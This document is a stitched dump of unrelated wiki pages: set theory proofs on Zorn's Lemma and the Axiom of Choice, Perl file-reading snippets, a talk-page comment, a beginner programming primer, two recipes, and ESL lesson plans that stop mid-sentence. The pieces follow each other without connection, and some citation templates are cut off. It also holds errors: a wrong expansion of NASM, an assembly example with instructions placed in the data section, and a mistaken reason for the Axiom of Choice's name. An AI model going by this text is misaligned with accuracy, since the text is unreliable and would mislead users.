      <text xml:space="preserve">Two dual ideas in set theory have to do with finding the &quot;largest&quot; possible objects in some set under a given ordering and with making a simultaneous selection of objects from many sets.  These notions are phrased in terms of Zorn's Lemma, and the Axiom of Choice and though they sound very different, they are equivalent to one another.  That is, given Zorn's Lemma, one can derive the Axiom of Choice and vice versa.  The Axiom of Choice is named as such because it is independent from Zermelo-Fraenkel set theory axioms.  Thus, the addition of Choice to ZF enables work not previously possible.  

== Zorn's Lemma ==

Zorn's Lemma, as usually stated, takes the form:

1)  If every [[w:Total order|chain]] in a [[w:partially ordered set|partially ordered set]] S has an upper bound, then S has a maximal element.

As Zorn's Lemma (ZL) has no proof or disproof from the axioms of [[w:Zermelo-Fraenkel set theory|Zermelo-Fraenkel set theory]] (ZF) (by famous work of Kurt Gödel and Paul Cohen), it makes sense to speak of certain propositions P logically equivalent to Zorn's Lemma  (over ZF). &quot;Logically equivalent&quot; means the existence of implications, provable in ZF, that say ZL ==&gt; P and P ==&gt; ZL. &quot;Provable,&quot; here, means provable in classical logic; often classically equivalent forms turn out independent with respect to, say, intuitionistic logic.  ([[w:Topos theory|Topos theory]] provides a context for separating, via counterexamples, classically equivalent but intuitionistically inequivalent statements.)

We immediately establish the logical equivalence of ZL with two similar propositions.

2) Let S be a set with partial order &amp;le;.  If every chain has a least upper bound, then a maximal element exists in S.

3) (Hausdorff Maximality Principle) Let S be a set with partial order &amp;le; such that every chain of S has an upper bound.  Then S contains a maximal chain (maximal with respect to set inclusion).

(1 =&gt; 2)   If every chain has a least upper bound, a fortiori every chain has an upper bound, so the conclusion of 1) follows, and so that of 2).

(2 =&gt; 3)  Write Chains(S) for the partially ordered set of chains contained in S, ordered by set inclusion.  (We shall apply 2) to Chains(S), not to S itself!)  Since every chain in Chains(S) has a least upper bound, namely its union, 2) grants us a maximal element in Chains(S), i.e. a maximal chain. 

=== Some details ===
The union U of a chain (C_i) in Chains(S) itself has the form of a chain. For given x and y in U, we must have x in C_j and y in C_k, say, and j &lt; k without loss of generality.  But having x and y both in C_k makes them comparable.

U, as a chain, then constitutes the least upper bound for (C_i) because it does as a set!

(3 =&gt; 1)  If a maximal chain C in a partially ordered set S has an upper bound u, then u belongs to C and constitutes a maximal element for S.  (If u does not belong to C, then C+{u} gives a larger chain; if u does belong to C but v&gt;u, then C+{v} gives a larger chain.

Though one might expect no content from the tautology 1) ==&gt; 1) that results from
combining the three implications above, actually, combining the proofs,
we see that whenever Zorn's Lemma fails for a partially ordered set S,
it must also fail for Chains(S), the chains of S ordered by inclusion.  Thus
if Zorn's Lemma holds for partial orders based on set inclusion, then it
holds in general!

== The Axiom of Choice ==
Often, Choice is stated &quot;For every nonempty set S, there exists a function f from the set &lt;math&gt;\mathcal{S}&lt;/math&gt; of all nonempty subsets of S to S such that f(A) is in A&quot;.  Parsing this, we assert that given a set, there is a way to simultaneously pick an element from each subset of the set.  This function is usually referred to as a &quot;choice function&quot;.

== Further Equivalents of the Axiom of Choice ==

There are literally hundreds of mathematical statements that are known to be logically equivalent to the Axiom of Choice.
Some of these statements are pure set-theoretic statements, such as Zorn's Lemma, above, while others are grounded in other mathematical disciplines.

In this section we will present some of these, mostly without proof.

=== Zermelo's Well-Ordering Theorem ===

Perhaps the most important equivalent of the Axiom of Choice (at least from the viewpoint of pure set theory) is Zermelo's Well-Ordering Theorem.

Before we state it, we must introduce some terminology:

A binary relation &lt;math&gt;R&lt;/math&gt; on a set &lt;math&gt;X&lt;/math&gt; is said to be '''[[/Well-founded|well-founded]]''' if there is no infinite sequence &lt;math&gt;\langle x_n \rangle_{n = 0}^\infty&lt;/math&gt; of elements of &lt;math&gt;X&lt;/math&gt; satisfying the following:
# &lt;math&gt;x_n \neq x_{n+1}&lt;/math&gt; for each &lt;math&gt;n&lt;/math&gt;, and
# &lt;math&gt;\langle x_{n+1} , x_n \rangle \in R&lt;/math&gt; for each &lt;math&gt;n&lt;/math&gt;.

A partial order relation &lt;math&gt;R&lt;/math&gt; on a set &lt;math&gt;X&lt;/math&gt; is called a '''well-order''' relation if
# for each &lt;math&gt;x,y \in X&lt;/math&gt; either &lt;math&gt;\langle x , y \rangle \in R&lt;/math&gt;, or &lt;math&gt;\langle y , x \rangle \in R&lt;/math&gt;, and
# &lt;math&gt;R&lt;/math&gt; is well-founded.

Zermelo's Well-Ordering Theorem is then the following simple statement:  Every set &lt;math&gt;X&lt;/math&gt; can be well-ordered.

=== Tychonoff's Theorem ===
States that the cartesian product of any arbitrary family of compact topological spaces is itself compact.

=== Existence of Non-Lebesgue Measurable Sets ===

Consider the unit interval &lt;math&gt;[0,1]&lt;/math&gt; and the equivalence relation defined the interval by &lt;math&gt;a \sim b\ \mbox{if}\ a - b \in \mathbb{Q}&lt;/math&gt;.  Certainly, this is an equivalence relation:

* &lt;math&gt;a \sim a&lt;/math&gt; because &lt;math&gt;a - a = 0&lt;/math&gt;, which is rational.
* &lt;math&gt;a \sim b&lt;/math&gt; implies &lt;math&gt;a - b&lt;/math&gt; is rational.  Then &lt;math&gt;b - a = -(a - b)&lt;/math&gt; is rational, and so &lt;math&gt;b \sim a&lt;/math&gt;.
*  &lt;math&gt;a \sim b\ \mbox{and}\ b \sim c&lt;/math&gt; implies that &lt;math&gt;a - b\ \mbox{and}\ b - c&lt;/math&gt; are rational.  Then, &lt;math&gt;a - c = (a - b) + (b - c)&lt;/math&gt; is rational too.  This implies &lt;math&gt;a \sim c&lt;/math&gt;.

Now, '''choose''' one representative from each equivalence class.  Call this set &lt;math&gt;S&lt;/math&gt;.  Can &lt;math&gt;S&lt;/math&gt; be Lebesgue measurable?  The answer is no.

To prove this, we note that any element of &lt;math&gt;x \in [0,1]&lt;/math&gt; differs by the chosen representative of its equivalence class &lt;math&gt;s_{x} \in S&lt;/math&gt; by a rational number in &lt;math&gt;(-1,1)&lt;/math&gt;,  However, there are only countably many rational numbers in &lt;math&gt;(-1,1)&lt;/math&gt;; enumerate them as &lt;math&gt;\left\{r_{k}\right\}_{1 \le k &lt; \infty}&lt;/math&gt;.  Define the set &lt;math&gt;S + r= \left\{s + r \mid s \in S\right\}&lt;/math&gt;, the translate of &lt;math&gt;S&lt;/math&gt; by &lt;math&gt;r&lt;/math&gt;.

Suppose &lt;math&gt;S&lt;/math&gt; is Lebesgue measurable.  Then, by translation independence, &lt;math&gt;S_{k} = S + r_{k}&lt;/math&gt; is also measurable, and has the same measure.  Note that by the choice procedure, the sets &lt;math&gt;S_{k}&lt;/math&gt; are all distinct.  Take the union of all the translates:

&lt;math&gt;\mathcal{S} = \bigcup_{k = 1}^{\infty} S_{k}&lt;/math&gt;.

If &lt;math&gt;S&lt;/math&gt; has measure zero, then &lt;math&gt;\mathcal{S}&lt;/math&gt; has measure zero too, by countable additivity.

If &lt;math&gt;S&lt;/math&gt; has positive measure, then &lt;math&gt;\mathcal{S}&lt;/math&gt; has measure &lt;math&gt;\infty&lt;/math&gt;, by countable additivity.  However,

&lt;math&gt;[0, 1] \subset \mathcal{S} \subset [-1, 2]&lt;/math&gt;,
and so &lt;math&gt;1 \le \mu(\mathcal{S}) \le 3&lt;/math&gt;.  But &lt;math&gt;\mu(\mathcal{S})&lt;/math&gt;  cannot fall within this range, and so &lt;math&gt;S&lt;/math&gt; is nonmeasurable.

= Read files =

== Procedural Interface ==

=== By slurping file ===

This method will read the whole file into an array. It will split on the special variable &lt;code&gt;$/&lt;/code&gt;

&lt;source lang=perl&gt;
# Create a read-only file handle for foo.txt
open ( my $fh, '&lt;', 'foo.txt' );

# Read the lines into the array @lines
my @lines=&lt;$fh&gt;;

# Print out the whole array of lines
print @lines;
&lt;/source&gt;

=== By line processing ===

This method will read the file one line at a time. This will keep memory usage down, but the program will have to poll the input stream on each iteration.

&lt;source lang=perl&gt;
# Create a read-only file handle for foo.txt
open ( my $fh, '&lt;', 'foo.txt' );

# Iterate over each line, saving the line to the scalar variable $line
while ( my $line = &lt;$fh&gt; ) {

  # Print out the current line from foo.txt
  print $line;

}
&lt;/source&gt;

== Object Oriented Interface ==

Using IO::File you can get a more modern object-oriented interface to a perl file handle.

&lt;source lang=perl&gt;
# Include IO::File which will give you the interface
use IO::File;

# Create a read-only file handle for foo.txt
my $fh = IO::File-&gt;new( 'foo.txt', 'r' );

# Iterate over each line, saving the line to the scalar variable $line
while ( my $line = $fh-&gt;getline ) {

  # Print out the current line from foo.txt
  print $line;

}
&lt;/source&gt;

&lt;source lang=perl&gt;
# Include IO::File which will give you the interface
use IO::File;

# Create a read-only file handle for foo.txt
my $fh = IO::File-&gt;new( 'foo.txt', 'r' );

my @lines = $fh-&gt;getlines;

# Print out the current line from foo.txt
print @lines;
&lt;/source&gt;

== This is too general, and too long.. ==

For a book that includes a section on &quot;moving the mouse&quot;, I think the discussion of assembly is a bit involved.

It'd be nice to start with programming opportunities built into XP, such as scripting or application languages. Show a few basic things that can be done, then talk about more advanced languages and give step-by-step getting started guides.

If I knew the first thing about modern programming, I'd write this section, but the last thing I programmed was a Commodore 64.

as it stands, this artical is poorly misnamed. it mentions no Windows XP whatsoever, and focuses entirely on differences between high and low level languages. we should either rename this artical &quot;General Programming for beginniners&quot;, or change focus immediately to WinXP programming (in C/Win32API, C++/MFC or VB). --[[User:Whiteknight|Whiteknight]] 16:44, 30 August 2005 (UTC)</text>

      <text xml:space="preserve">== Taking your first step into the world of programming ==
Computer programming (often simply programming) is the craft of implementing one or more interrelated abstract algorithms using a particular programming language to produce a concrete computer program. Programming has elements of art, science, mathematics, and engineering. The first step to programming is knowing the basics of mathematics (mainly Algebra). Programming is usually done by writing human-readable code into a text editor and then compiling that code into a form the computer understands, called binary file.

== Types of programming languages ==

There are two types of programming languages based on the code or syntax they use. One is low level and the other is high-level programming languages. The difference between them is on the way we write their code. For example, Assembly is a low-level language where the user writes code which is almost identical to the one computers understand (see below for more info). A high-level programming language uses a more natural and human-readable syntax which makes it easier for humans to understand and write. The problem with high-level languages is that the programmer doesn't exactly know how his code will be translated (compiled) into the code the computer understands, thus making it less powerful compared to the low level languages. Today, most programmers use some sort of a high-level language, because it is much easier to learn and understand and often requires much less work.

'''Low level languages'''

A typical example of a low-level programming language is Assembly. Assembly offers the ''lowest'' level of programming experience, meaning that one has absolute control over everything the machine will do. Although this offers programmers the most power, it is very hard to learn and even the most basic task can require a painful amount of work on the part of the programmer. Once compiled, assembly programs offer the fastest execution and most precise processor control possible. Assembly is often used for smaller, speed critical, projects such as writing a device driver, but due to its hard to understand syntax and complexity, today it is being replaced by high-level languages. The big difference between low-level and high-level languages is how the code is compiled into the binary form. Compiler used for compiling Assembly code is named assembler and as programmers say, the code written is assembled into binary form, not compiled (see under compilers for more details). There are also many Assembly languages, each for its platform. Although they are extremely hard to use, they are a very good learning tool, because an Assembly programmer is required to understand how the machine works (mainly CPU and RAM) in order to write code. MASM (Microsoft's Macro Assembler) is a popular assembler for the 80x86 (Pentium/Athlon) platform for Windows, others popular assemblers are TASM (Borland's Turbo Assembler) and the opensource FASM (Flat Assembler). NASM (The Nationwide Assembler), is currently the most versatile and popular compiler in existence.

Randall Hyde has also written a popular assembler for the 80x86 platform, called HLA (High Level Assembly) which is an attempt to simplify learning Assembly with a high-level syntax. Although one can use the high-level syntax, Randall Hyde has repeatedly stressed that a programmer can still code using a series of CMP's and Jcc's, instead of .IF for example.

This is an Assembly code snippet of a program written in MASM which loads two numbers (in the registers eax, and ebx) adds them and stores the result (in the register ecx).

 .model small, C
  .586
 
  .data
 
  mov eax,5
  mov ebx,10
 
  add eax,ebx
  mov ecx,eax
 
  end

'''High level languages'''

Due to the fact that the complexity of Assembly language programming is extremely hard to learn, and written programs are hard to maintain, low-level languages often cannot be ported to another platform, because they use platform, or, rather, CPU specific instructions, thus written Assembly code for the PC isn't portable to another platform (such as the Mac for example) without the complete rewrite of the program. Programmers were in a need for a language that could be easily understood and be portable, therefore high-level languages were created. The major difference between high-level and low-level languages is the way they are written and compiled. 

While Assembly code is assembled into binary without any modifications than converting the syntax into CPU instructions, high-level languages use a compiler which also converts code into binary form, but instead of using a syntax which symbolizes CPU instructions, it used a readable, human-understandable code, thus making it easier and quicker to write, learn and maintain. The downfall is that the compiler is responsible for converting the code and often it produces a slower running binary then Assembly would. 

Compilers are extremely good at optimizing code and most of the time produce a binary with the same running speed Assembly would if used correctly. They are also smart enough to tell us if there's a problem in our code and sometimes even fix it by themselves. Today, where speed is not as important as it was many years ago, high-level languages are most programmer's choice.

Although we already know two types of languages, there are also low-level and high-level languages in high level languages. A programming language may even be high-level and low-level at the same time. A typical example of this would be C or C++. Both offer low-level operations (even manipulating the smallest forms known to a computer - bits), but they also offer a natural and easy to use syntax. A typical example of a fully high-level language would be C# or Java which don't offer any low-level operations and are thus even easier to learn and write. 

The difference between programming language levels is speed - the higher level the language, the slower the binary and the quicker the learning curve.

Below is the code written in C which (as the previous Assembly example) adds two numbers and stores the result.

 int main()
 {
   // assign to the variable result the value of 5 + 10
   int result = 5 + 10;
 
   return 0;
 }

The mathematical 'equals' operator ('=') has a different meaning in C so let me explain what this program does. It takes two numbers, 5 and 10, adds them and stores them in a local variable (which is stored in RAM) we called 'result'.

Another popular high-level programming language is Microsoft's Visual Basic. It is often used for learning programming, because of its ease of use and understanding. All programming languages require some basic knowledge of mathematics (mainly Algebra) and  the basics of how computers work. Also every programming language serves its purpose. For example, PHP is used for programming dynamic web pages while C# is used for programming Windows applications and Java is used for programming platform independent applications.

== How programs work ==

It is very important that you understand at least the very basics of how computers work, because learning any language it is required to know this first. Computers use the processor (CPU) to execute instructions, memory (RAM) to store the running program and hard drive (HDD) to store data and programs that are not running at that time. In order for a program to add two numbers like we did in the previous example, the program must know at compile time and before the program is run, how much memory it should ask for and what it would store there. Computers use variables to do this. Variables are data stored in RAM which can be changed any time while the program is running. In our example, we didn't use variables, but we used constants - plain numbers which can not be changed at runtime. This, you will find, is extremely useless as most of the time we don't know exactly what our program will do. 

A calculator would be useless without user input and if it could only add numbers that were already given to him at compile time. Therefore, variables are the primary thing you will get to know at programming. When you run the program we wrote in C, the program knows it has two numbers in it and asks the operating system for space in memory for 2 integer numbers. Integer numbers are whole numbers such as 1, 24 and 1497. Not only does the program have to know how much space it has to ask, but even what type of a variable it will store. Will it be an integer or a character string?

Whenever one uses a program that asks for user input (a calculator for example) it has already made place in RAM for the number one will type in. When you do type it in, it stores it in that place and marks its type - if you type in 33 it will mark it as an integer, if you typed in 3.14 it will mark it as a real number. 

Real numbers are numbers with fractions. For example 1.33 is a real number, so is 0.25 and so on. Knowing what type of a variable the program stores, it knows what it can do with it. So if we have real numbers or integers we can multiply them, divide them etc. But we can not do those things with a character string. We can't divide words and letters.

The other major thing to know about programming is that computers can't think. Computers are pretty much useless machines without a human to operate it. The computer does ''exactly'' what you tell it to do and nothing more. This, as you have probably notice, doesn't seem true all the time, but it is almost never the computer's fault and almost always programmer's. Computers do not understand numbers, words or any other human-readable type. They can only understand two states; true and false. 

You have probably heard that computers work with 1's and 0's but that is not the case. They work with electricity and nothing more. We made up those 1's and 0's to make it simplier for us to understand them.  (1's and 0's represent voltage changes).Computers cannot think or do anything useful without someone programming it. They can only compare numbers and nothing else. It is important to know this, so you start thinking as a computer programmer.

{{recipe}} | [[Cookbook:Cuisine of the United Kingdom|Cuisine of the United Kingdom]] | [[Cookbook:Meat_Recipes|Meat recipes]]

'''Lancashire Hotpot''', originating from [[Cookbook:Cuisine of the United Kingdom|England]], is a very easy but delicious dish that consists of lamb, onions, potatoes and the cook's choice of [[Cookbook:Herbs|herbs]]. This is [[Cookbook:Baking|baked]] in an oven.

==Ingredients==
*2 [[Cookbook:Pound|lb]] (900[[Cookbook:g|g]]) neck of [[Cookbook:Lamb|lamb]] or [[Cookbook:Mutton|mutton]]
*2 large [[Cookbook:Potato|potatoes]]
*1 large or 2 small white [[Cookbook:Onion|onion]](s)
*Choice of mixed [[Cookbook:Herbs|herbs]]
*500 [[Cookbook:mL|mL]] boiling water

==Procedure==
# Dice the lamb and set aside. Preheat [[Cookbook:Oven|oven]] to [[Cookbook:Oven_Temperatures|325F / 170C / Gas Mark 3]].
# Slice the potatoes and dice the onions.
# Add a layer of the potatoes to the bottom of a casserole dish, and cover with a handful of the diced onion. Layer the diced lamb on top of this, sprinkling with your choice of herbs.
# Repeat these layers until the dish is full. Top with a final layer of the potatoes.
# Pour boiling water into the dish until filled - if more water is needed, continue to add until topped.
# Bake for at least one hour, though traditionally the dish was left baking all day, longer times are required for Mutton.

==Notes, tips, and variations==
*A handful of mixed [[Cookbook:Vegetable|vegetables]] such as [[Cookbook:Parsnip|parsnips]], [[Cookbook:Turnip|turnips]], [[Cookbook:Leek|leek]] or [[Cookbook:Carrot|carrots]] can be added to the dish. It is worth experimenting to find out what combination of flavours you prefer.
*The dish has occasionally been known to be cooked with [[Cookbook:Oyster|oyster]]s or with small birds such as snipe, when they were available.
*Flavour can be improved by adding a stock cube to the boiling water.
*Many people like to add in small quantities of instant gravy granules to add a little flavour to the dish.

{{recipesummary|Pasta recipes|6|60 minutes|2|Image=[[Image:Classic-spaghetti-carbonara.jpg|300px]]}}

'''''Spaghetti alla carbonara''''' (literally: charcoal burners' spaghetti in Italian) is an Italian pasta dish based on eggs, pecorino romano, guanciale and [[Cookbook:Pepper|black pepper]]. It was created in the middle of the 20th century.&lt;ref name=&quot;Alberini&quot;&gt;{{cite book |first=Massimo |last=Alberini |coauthors=Giorgio Mistretta |title=Guida all'Italia gastronomica |publisher=Touring Club Italiano |date=1984 |page=286}}&lt;/ref&gt;

Recipes vary, though all agree that pecorino romano, eggs, cured fatty pork and black pepper are basic. The pork is fried in fat ([[Cookbook:Olive Oil|olive oil]] or lard). Then, a mixture of eggs, cheese and olive oil is combined with the hot pasta, thereby cooking the eggs. All of the ingredients are then mixed together.&lt;ref name=&quot;Alberini&quot; /&gt;&lt;ref&gt;{{cite book |last=Gossetti Della Salda |first=Anna |title=Le ricette regionali italiane |publisher=Solares |location=Milan |date=1965}}&lt;/ref&gt;&lt;ref&gt;Accademia Italiana della Cucina, ''Ricettario nazionale delle cucine regionali italiane''&lt;/ref&gt; Guanciale is the most traditional bacon for this recipe, but pancetta is a popular substitute.&lt;ref&gt;Luigi Carnacina, Luigi Veronelli, ''La cucina rustica regionale'' (2. Italia Centrale), Rizzoli, 1977 republication of ''La Buona Vera Cucina Italiana'', 1966.&lt;/ref&gt;&lt;ref&gt;Vincenzo Buonassisi, ''Il Nuovo Codice della Pasta'', Rizzoli, 1985.&lt;/ref&gt; In the US, it is often made with American bacon.

Cream is not common in Italian recipes, but is used in the United States&lt;ref&gt;{{cite web |last=Herbst |first=Sharone Tyler|authorlink=Sharon Tyler Herbst |coauthors=Ron Herbst |work=The New [[wikipedia:Food Lover's Companion|Food Lover's Companion]], Fourth Edition |publisher=Barron's Educational Series.

In all versions of the recipe, raw eggs are added to the sauce and cook with the heat of the pasta.

==Origin and history==
Like most recipes, the origins of the dish are obscure but there are many legends. As 'carbonara' literally means 'coal miner's wife', some believe that the dish was first made as a hearty meal for Italian coal miners. Others say that it was originally made over charcoal grills, or that it was made with squid ink, giving it the color of coal. It has even been suggested that it was created by, or as a tribute to, the &quot;charcoalmen&quot;, a secret society prominent in the unification of Italy. Also, the name may be from a Roman restaurant named ''Carbonara''&lt;ref name=&quot;mariani&quot;&gt;{{cite book

The dish is not present in Ada Boni's 1927 classic ''La Cucina Romana'', and is unrecorded before the Second World War. It was first recorded after the war as a Roman dish, when many Italians were eating eggs and bacon supplied by American troops. &lt;ref&gt;{{cite book

==Ingredients==
*[[Cookbook:Pasta|spaghetti]]: 450g (1 pound)
*[[Cookbook:Pancetta|pancetta]]: 225g (½ pound) 
*[[Cookbook:Egg yolk|egg yolks]]: 5
*[[Cookbook:Pecorino Romano Cheese|Pecorino]] or Parmigiano-Reggiano cheese, grated: 360ml (1½ cups) 
*[[Cookbook:Olive Oil|olive oil]], extra-virgin: 3-4 tablespoons
*[[Cookbook:Pepper|pepper]], freshly ground: ½ tablespoon
*[[Cookbook:Salt|salt]]

==[[Cookbook:Utensil|Utensils]]==
*large pot
*large skillet
*bowl
*measuring cups and spoons
*fork

==Procedure==
#Dice the pancetta into small pieces (1 inch [2.5cm] will do).
#Bring a big pot of water to a boil and add salt when it begins to simmer.
#Cook the spaghetti until it is [[Cookbook:al dente|al dente]] and drain it, reserving ½ cup (118 ml) of water.
#As spaghetti is cooking, heat the olive oil in a large skillet over a medium-high heat. When the oil is hot, add the pancetta and cook for about 10 minutes over a low flame until the pancetta has rendered most of its fat but is still chewy and barely browned.
#In a bowl, slowly whisk about ½ cup of the pasta water into the egg yolks, using a fork. Add the grated cheese and pepper. Mix with a fork.
#Transfer the spaghetti immediately to the skillet with the pancetta. Toss it and turn off the heat. Add the egg mixture to the skillet with the pasta and toss all the ingredients to coat the pasta. Taste the pasta and add salt and black pepper, if necessary.

==Beverages==
Ideally this dish is served with a red   [[Cookbook:Wine|wine]] (Merlot, Chianti, Montepulciano d’Abruzzo), allowed to decant for several hours, and served at 65°F (18°C).

Objectives:
To provide an opportunity for every student to practice their 
public speaking skills.
Materials needed:
*	Student Workbook
*	Pencils / Pens
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
No special preparation is needed for this activity.

Warm Up (&lt;5 minutes):
This activity will be very academic and the students will be 
sitting for the most of it. Get the students to stand up and 
stretch before you begin.

Activity (30 minutes):
Tell the students they will be writing and performing a ten-
minute radio show featuring an introduction, a weather report, 
a celebrity interview, a news story, and a sign off. Make it 
clear that each student must play a role. Be sure to 
demonstrate how fun and useful it is to act a part (i.e. 
Pretending to be someone else helps to overcome shyness, 
practicing pronunciation of dialogue improves speaking skills, 
and so on). The Student Workbook illustrates the script 
structure, and provides useful vocabulary for some of the 
broadcast. Briefly explain the ideas of word stress and 
sentence intonation. This step should take approximately 5 
minutes.

Put students into groups:

*	2 students for the introduction and signoff
*	3 students for the weather report
*	2 students for the celebrity interview
*	3 students for the news

You may let the students choose their topics or you can assign 
them directly. Using the workbook they must work together to 
draft their part of the script. Each group should aim to fill 
three minutes of speaking. Walk around assisting in the 
development of their scripts, correcting grammar when 
necessary. Provide ideas if they are creatively stumped. This 
step should take approximately 15 minutes.

Once they have finished the scripts have them copy their text 
to the worksheets at the end of the lesson. Have them start 
practice reading their role. Circulate and ensure they are 
practicing the speech sounds correctly. Pronounce words and 
sentences for them, pointing out stress patterns and 
intonation. This step should take approximately 15 minutes.

Finally, have the class do a complete uninterrupted practice 
performance. Ensure that you have the students understand the 
order that they are speaking in. There is a spot on the 
worksheet to help organize the order of speaking. Try and 
provide the segue phrases connecting the different parts of 
the show and, if available, some short clips of music. This 
step should take approximately 10 minutes.



Group Broadcasting

You are a special news team and are making a radio show. You 
will work together with your class to write your show and then 
practice performing it. Together as a class you will present 
it to the other students of the Jump Into English program.

Use this part of your workbook to help you write what you will 
say on your show. When you are done, copy the dialogue to the 
script worksheets at the end of this section. They will 
be easier to read when you produce the show.
Introduction:

There are 2 students in your group. One student will perform 
the introduction and the other will perform the signoff.

What is the name of your radio show?


Say hello and describe your show to the audience. Remember to 
introduce all the members of your show.

Here is an example of how you might begin:
“Good morning everyone! The presenters on today’s show are 
Bobby, Peter, Sally…”Weather report

           

Here are some words that will help you talk about the weather:

Hot
Cold
Warm
Cool
Rain
Snow
Sunny
Cloudy
Ice
Storm
Humid
Temperature
Dry
Wet
Overcast
Summer
Fall
Winter
Spring
Thunder
Lightning
Clear skies
Flood
Wind

There are 3 students in your group. Each student must pick a 
day (yesterday, today, tomorrow) and write what the weather 
was, is, or will be like. Also say something that would be fun 
to do because of the weather.

What season will it be?


Yesterday…






Today…







Tomorrow…Celebrity interview

   

There are 2 students in your group. One will pretend to be the 
interviewer and ask the questions. The other will pretend to 
be the celebrity and answer the questions. You must write 2 
questions and 2 answers.

Who is the star on your show?


Why are they famous?


Here is an example of a question to ask the celebrity: 

Interviewer:
Thank you for talking with us (name of star). How was your 
day?

Her is an example of the answer the celebrity would give:

Celebrity:
Very good. Thank you for inviting me on your show. 

Write two more questions to ask the celebrity and then the 
answers they will give.
Interviewer Question 1:





Celebrity Answer 1:






Interviewer Question 2:





Celebrity Answer 2:News Headlines

  

There are 2 students in your group. Each of you must write a 
news headline and a short sentence about it.

Here is an example of what you might write:

Headline:
Man bitten by dog!

Story:
A man was bitten by a dog while hiking up the mountain. The 
man is okay but the dog has not been found.

Headline 1:


Story 1:






Headline 2:


Story 2:




Signoff

There are 2 students in your group. One student will perform 
the introduction and the other will perform the signoff. The 
signoff is the same as goodbye.

What is the name of your radio show?


Thank the audience for listening to your show.





Say goodbye to the audience.






Worksheet

==Group Newspaper==

The purpose of this activity is to create a newspaper about 
the homeroom class. This is a chance for the students to 
report on the news that has happened and activities they have 
done since they’ve been a part of the Jump Into English 
program. Also, they can express their feelings about the 
program in a public medium that will be read by future 
students. Follow the lesson plan on the following pages to 
guide your class through the process of creating and producing 
the newspaper. The Student Workbook provides pages for rough 
work.




Group Newspaper

Objectives:
To give students the opportunity to report the news and 
express their feelings about the program in a public medium 
that will be read by future students.
Materials needed:
*	Blackboard
*	Chalk/Marker
*	Poster Board
*	Markers, Crayons, etc
*	White A4 Paper
*	Glue sticks
*	Strong clear tape
*	Scissors
*	Optional: Colored paper, The Teen Times, previous 
newspapers
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
Prepare the above materials to be used in class.
Arrange desks for groups of 2-3 students.

Warm Up (10 minutes):
Explain to students the objective of the lesson and show 
examples of previous weeks’ newspapers posted on the wall. If 
there are no previous newspapers available, use The Teen Times 
or a newspaper from the high school program.

Have the students get up out of their seats to look at the 
previous newspapers for ideas of articles/sections.

Activity (30 minutes):
Have students explain what types of articles/sections they saw 
in the previous weeks’ newspapers. The teacher should write 
these on the board. The teacher should then ask the students 
if they have any other ideas of their own to add to the list. 
The following is a list of supplemental ideas or 
articles/sections:

*	Material from the group broadcast
*	Weather
*	Students comments about the program
*	Interview with homeroom teacher
*	Music, movie, or book review
*	Quizzes, Jokes, Comics
*	Advertising

From the list on the board, the students should choose 
articles/sections to write. There should be two to three 
students assigned to an article/section. Additionally, one 
student should be chosen to be the editor to assist the 
teacher in the layout and production of the whole newspaper. 
The editor should also choose and write out the title of the 
newspaper at the top of the poster board while the other 
students are writing their articles.

The students should get into their groups (the two to three 
students who are assigned to the same article/section form a 
group) to produce a rough draft of their article/section on a 
blank Worksheet in their textbook. While the students are 
working on their articles/sections, the teacher should walk 
around the classroom to help the groups with individual 
problems such as grammar, spelling, word choice, etc.

When students finish their rough draft, the teacher should 
have the students work on a blank piece of A4 paper to write 
their final draft using the available art supplies. Make sure 
that each article/section has a headline and authors’ names. 
If the students have not started on their final draft when 
there are approximately 20 minutes remaining in the class, the 
teacher should help them along to finish in time.

Once the final drafts are finished, the editor should cut out, 
layout, and paste the pages onto the poster board. If 
necessary, an artistic student can add artwork where there is 
white space on the poster board. When the newspaper is 
completed, it should be taped up outside the classroom.

Summary (5 minutes):
While showing the class the completed newspaper, briefly 
review the objective of the lesson. Emphasize that future 
students of the program will be reading their newspaper and 
that by creating the newspaper they have left a record of 
their class.



Group Newspaper

During this activity you will create a newspaper about your 
class. This is your chance to report on the news that has 
happened and activities you have done since being a part of 
the Jump Into English program. Also, you can express your 
feelings about the program in a public medium that will be 
read by future students.

Use the Worksheet pages in this section of the book to 
write your newspaper articles. Remember to copy of your work 
to a blank piece of A4 paper (provided by your teacher). You 
will be gluing it onto a poster board to display to the rest 
of the students.




==My Jump Into English Yearbook==





Yearbook

The purpose of this activity is to create a yearbook for your 
homeroom class. This is a chance for the students to write to 
each other about their time together at the Jump Into English 
program. They can exchange personal information to help them 
stay in touch with the new friends they’ve made. There is no 
set lesson plan for this activity but it does require access 
to a digital camera, basic photo editing software, computers, 
and printers. On day 1 of the program set aside time to take 
digital photographs of all the students and teachers. Use 
their classroom and student numbers to help organize the files. 
Following this you must find the time to edit the photographs 
for color, dimensions, and resolution. Each teacher should 
receive a file with all ten student photographs and one 
teacher photograph. During the yearbook activity you can print 
out this file so that each student has a copy of all the 
pictures. Using your art supplies, have the students cut out 
the photographs and paste them into their workbooks. They can 
then share workbooks and write to each other in the blank 
profiles.

==Reading==




===Hints===
A little every day…

Read the newspaper every day. You don’t have to read 
everything. Read the headlines and the first paragraphs. 

Always carry an English book with you. When you have to wait 
somewhere, you can do a little reading.

When you are reading a novel, it doesn’t matter if you don’t 
understand every word. As long as you get the general idea of 
the page you are reading, then keep reading

When you are watching an English DVD, put on the English 
subtitles. You can practice your reading and listening at the 
same time.

Start a reading circle. You and your friends can read the same 
book. Then you can get together and talk about the book (in 
English of course).



===Context Clues===

Objectives:
To introduce a reading strategy that will increase the 
student’s understanding of texts. Students will learn how to 
guess the meaning of words through context, understand the 
importance of making connections and thinking about the text 
while they read. They will be given the opportunity to use the 
reading strategy and will write a journal entry on the 
effectiveness of the strategy.
Materials needed:
*	Teachers need the handout with the problem paragraph.
*	Teachers should have an article that is slightly beyond 
the students’ reading ability to show when this strategy 
is important
Vocabulary substitution:

Procedure:
Setting Up the Classroom:
There is no special preparation for this lesson.

Warm Up (10 minutes):
Write this example sentence on the board: &quot;Tom decided that he 
really needed the glockum if he were to solve the problem&quot;. 
Ask students what they do if they are reading an English text 
and do not understand a specific word. Ask students what they 
do if they are reading a text in their native language and do 
not understand a specific word. Ask students what 'glockum' 
means. Once students have established that they don't know 
what a 'glockum' is, ask them to guess at what it might be. 
Ask students what part of speech a 'glockum' is (i.e. verb, 
noun, preposition etc.). Have students explain how they 
arrived at their guesses, which clues did they use? Explain 
the concept of reading in &quot;chunks&quot; i.e. looking at the text 
surrounding the unknown word for clues.

Activity (30 minutes):
Show the students an article from an advanced level magazine 
